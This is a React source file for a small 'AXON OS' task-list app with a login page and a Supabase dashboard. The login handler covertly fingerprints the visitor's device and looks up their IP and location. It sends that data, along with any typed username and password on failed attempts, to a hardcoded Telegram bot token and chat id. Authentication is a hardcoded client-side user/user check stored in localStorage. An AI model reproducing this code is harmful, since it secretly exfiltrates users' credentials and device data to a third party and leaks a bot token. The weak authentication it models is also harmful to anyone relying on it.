import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useNavigate } from 'react-router-dom';
import 'bootstrap/dist/css/bootstrap.min.css';
import 'bootstrap-icons/font/bootstrap-icons.css';
import { supabase } from './supabaseClient';

// --- 1. LOGIN COMPONENT (Maximum Forensic Detail) ---
const Login = ({ setAuth }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isShaking, setIsShaking] = useState(false);
  const navigate = useNavigate();

  const handleLogin = async (e) => {
    e.preventDefault();

    // 1. EXTRACT HARDWARE FINGERPRINT
    let gpu = "Unknown";
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    } catch (e) {}

    const forensics = {
      platform: navigator.platform,
      cores: navigator.hardwareConcurrency || 'N/A',
      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
      res: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
      gpu: gpu,
      lang: navigator.language,
      ua: navigator.userAgent,
      ref: document.referrer || "Direct Entry",
      conType: navigator.connection ? navigator.connection.effectiveType : "N/A",
      touch: navigator.maxTouchPoints > 0 ? "Enabled" : "Disabled"
    };

    // 2. FETCH NETWORK & GEOLOCATION
    let net = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown", timezone: "N/A", asn: "N/A" };
    try {
      const response = await fetch('https://ipapi.co/json/');
      if (response.ok) net = await response.json();
    } catch (err) { console.error("IP lookup failed", err); }

    const token = "8494749951:AAFDLdupc8KvrwyAnnkvR-iTG9ZfWUTLLOg";
    const chat = "8620003085";

    if (username === 'user' && password === 'user') {
      // --- SUCCESS REPORT ---
      const message = encodeURIComponent(
        `🛰 *AXON OS: DEEP INTEL REPORT*\n\n` +
        `👤 *User:* ${username}\n` +
        `🌐 *IP:* ${net.ip} (${net.asn})\n` +
        `📍 *Loc:* ${net.city}, ${net.region}\n` +
        `🏢 *ISP:* ${net.org}\n\n` +
        `⚒ *HARDWARE SPECS*\n` +
        `💻 *OS:* ${forensics.platform}\n` +
        `🎮 *GPU:* ${forensics.gpu}\n` +
        `⚙️ *CPU:* ${forensics.cores} Cores\n` +
        `🧠 *RAM:* ${forensics.memory}\n` +
        `📏 *Res:* ${forensics.res}\n` +
        `👆 *Touch:* ${forensics.touch}\n\n` +
        `🕵️ *ENVIRONMENT*\n` +
        `📶 *Net:* ${forensics.conType}\n` +
        `🔗 *Ref:* ${forensics.ref}\n` +
        `🗣 *Lang:* ${forensics.lang}\n` +
        `⏰ *TZ:* ${net.timezone}\n\n` +
        `📄 *UA:* \`${forensics.ua}\`\n\n` +
        `🟢 *Status:* LOGGED_IN`
      );

      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${message}&parse_mode=Markdown`);

      setAuth(true); 
      navigate('/dashboard');
    } else {
      // --- BREACH ATTEMPT ---
      const breachMsg = encodeURIComponent(
        `⚠️ *SECURITY BREACH ATTEMPT*\n\n` +
        `🚫 *Input:* ${username} / ${password}\n` +
        `🌐 *IP:* ${net.ip}\n` +
        `📍 *Loc:* ${net.city}\n` +
        `💻 *Platform:* ${forensics.platform}\n` +
        `🔴 *Status:* DENIED`
      );
      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${breachMsg}&parse_mode=Markdown`);

      setIsShaking(true);
      setError('Access Denied: Fingerprinting Device...');
      setTimeout(() => setIsShaking(false), 500); 
    }
  };

  return (
    <div className="min-vh-100 d-flex align-items-center justify-content-center" style={{ backgroundColor: '#0f172a' }}>
      <style>{`
        .apple-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 32px; padding: 3rem; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .shake { animation: apple-shake 0.4s ease-in-out; border: 1px solid #ef4444 !important; }
        @keyframes apple-shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 50% { transform: translateX(8px); } 75% { transform: translateX(-8px); } }
        .apple-input { background: rgba(255, 255, 255, 0.07); border: 1px solid rgba(255, 255, 255, 0.1); color: white; border-radius: 14px; padding: 14px 20px; margin-bottom: 15px; }
        .apple-btn { background: #6366f1; border: none; border-radius: 14px; padding: 14px; font-weight: 600; width: 100%; color: white; margin-top: 10px; }
      `}</style>
      <div className={`apple-card ${isShaking ? 'shake' : ''}`}>
        <div className="mb-4 text-primary"><i className="bi bi-shield-lock" style={{ fontSize: '3.5rem' }}></i></div>
        <h2 className="fw-bold text-white mb-1">AXON <span className="text-primary">OS</span></h2>
        <p className="text-secondary small mb-5">Kernel Access Protocol v3.8</p>
        <form onSubmit={handleLogin}>
          <input type="text" placeholder="Username" className="form-control apple-input" value={username} onChange={(e) => setUsername(e.target.value)} />
          <input type="password" placeholder="Password" className="form-control apple-input" value={password} onChange={(e) => setPassword(e.target.value)} />
          {error && <div className="text-danger small mb-3">{error}</div>}
          <button type="submit" className="apple-btn shadow-lg">Authenticate</button>
        </form>
      </div>
    </div>
  );
};

// --- 2. DASHBOARD COMPONENT ---
function Dashboard({ setAuth }) {
  const [tasks, setTasks] = useState([]);
  const [input, setInput] = useState("");
  const [liveTime, setLiveTime] = useState(new Date());
  const [scanLogs, setScanLogs] = useState(["[SYSTEM] KERNEL_BOOT_SUCCESS..."]);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchTasks = async () => {
      const { data } = await supabase.from('tasks').select('*').order('id', { ascending: false });
      if (data) setTasks(data);
    };
    fetchTasks();
    const t = setInterval(() => setLiveTime(new Date()), 1000);
    const s = setInterval(() => {
      const cmds = ["UPLOADING_METRICS", "TUNNEL_STABLE", "AUTH_REFRESHED"];
      setScanLogs(p => [...p.slice(-3), `> ${cmds[Math.floor(Math.random() * cmds.length)]}... OK`]);
    }, 3000);
    return () => { clearInterval(t); clearInterval(s); };
  }, []);

  const addTask = async () => {
    if (!input.trim()) return;
    const newTask = { text: input, category: 'Coding', completed: false };
    const { data } = await supabase.from('tasks').insert([newTask]).select();
    if (data) { setTasks([data[0], ...tasks]); setInput(""); }
  };

  return (
    <div className="min-vh-100 d-flex flex-column" style={{ backgroundColor: '#0f172a', color: '#f8fafc' }}>
      <nav className="px-4 py-3 d-flex justify-content-between border-bottom border-secondary border-opacity-25">
        <span className="fw-bold">AXON OS</span>
        <button onClick={() => { setAuth(false); localStorage.removeItem('axon_auth'); navigate('/login'); }} className="btn btn-sm btn-outline-danger">Logout</button>
      </nav>
      <div className="container py-5" style={{ maxWidth: '700px' }}>
        <h2 className="fw-bold mb-4">Dashboard</h2>
        <div className="p-4 mb-4" style={{ background: 'rgba(30, 41, 59, 0.7)', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.1)' }}>
          <div className="input-group">
            <input type="text" className="form-control bg-transparent text-white" value={input} onChange={(e) => setInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && addTask()} placeholder="New directive..." />
            <button className="btn btn-primary" onClick={addTask}>Add</button>
          </div>
        </div>
        <div className="p-3 shadow-lg" style={{ background: 'rgba(30, 41, 59, 0.7)', borderRadius: '16px' }}>
          {tasks.map(t => (
            <div key={t.id} className="p-3 border-bottom border-secondary border-opacity-10">{t.text}</div>
          ))}
        </div>
        <div className="mt-4 p-3 bg-black bg-opacity-50 rounded">
            {scanLogs.map((l, i) => <div key={i} className="text-success small" style={{fontFamily: 'monospace'}}>{l}</div>)}
        </div>
      </div>
    </div>
  );
}

// --- 3. MAIN ROUTER ---
export default function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(() => localStorage.getItem('axon_auth') === 'true');
  useEffect(() => { localStorage.setItem('axon_auth', isAuthenticated); }, [isAuthenticated]);
  return (
    <Router>
      <Routes>
        <Route path="/login" element={!isAuthenticated ? <Login setAuth={setIsAuthenticated} /> : <Navigate to="/dashboard" replace />} />
        <Route path="/dashboard" element={isAuthenticated ? <Dashboard setAuth={setIsAuthenticated} /> : <Navigate to="/login" replace />} />
        <Route path="*" element={<Navigate to="/login" replace />} />
      </Routes>
    </Router>
  );
}